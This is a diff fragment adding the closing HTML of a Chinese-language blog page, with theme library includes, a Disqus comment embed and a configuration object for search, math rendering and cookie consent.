+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="https://zyLeoblog.disqus.com/embed.js" defer></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
